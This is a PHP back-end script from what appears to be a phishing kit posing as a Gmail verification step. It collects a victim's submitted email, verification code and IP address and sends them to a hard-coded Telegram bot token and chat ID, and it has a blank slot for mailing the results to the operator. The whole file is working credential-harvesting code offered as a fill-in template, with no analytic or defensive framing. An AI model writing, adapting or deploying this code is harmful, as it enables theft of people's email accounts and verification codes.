<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Allow-Headers: Content-Type");

// include("./result.php");

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST)) {
    $ips = getenv("REMOTE_ADDR");

    $email = filter_var($_POST['aa'], FILTER_SANITIZE_EMAIL);
    $password = htmlspecialchars($_POST['bb']);

    function sendTelegramMessage($message) {
        $telegramBotToken = '7640000631:AAEqrYnTJygOe1sf6L7QWohTySc-5davMS8'; // BOT TOKEN
        $telegramChatID = '2074391753'; // CHATID

        $url = "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$telegramChatID&text=" . urlencode($message);

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
        $result = curl_exec($ch);
        curl_close($ch);

        return $result;
    }

    $resultbox = ""; // YOUR EMAIL FOR RESULT
    
    $subject = "New Login GMAIL-VERIFY-COD";
    $message .= "--------GMAIL-VERIFY-CODE---------";
    $message = "User-email: $email\r\n";
    $message .= "Code: $password\r\n";
    $message .= "IP: $ips\r\n";
    $message .= "Login Successful: GMAIL-VERIFY-COD\r\n";
    sendTelegramMessage($message);
    $headers = "From: ❤WEBMIL-ACCESS❤ <julianna1@gmail.com>\r\n"; // change email to a valid email
    $headers = "Content-type: text/plain\r\n";

    if (mail($resultbox, $subject, $message, $headers)) {
        echo json_encode(['status' => 'success', 'message' => 'Data sent successfully']);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Failed to send data']);
    }
} else {
    echo json_encode(['status' => 'error', 'message' => 'No data received']);
}
?>
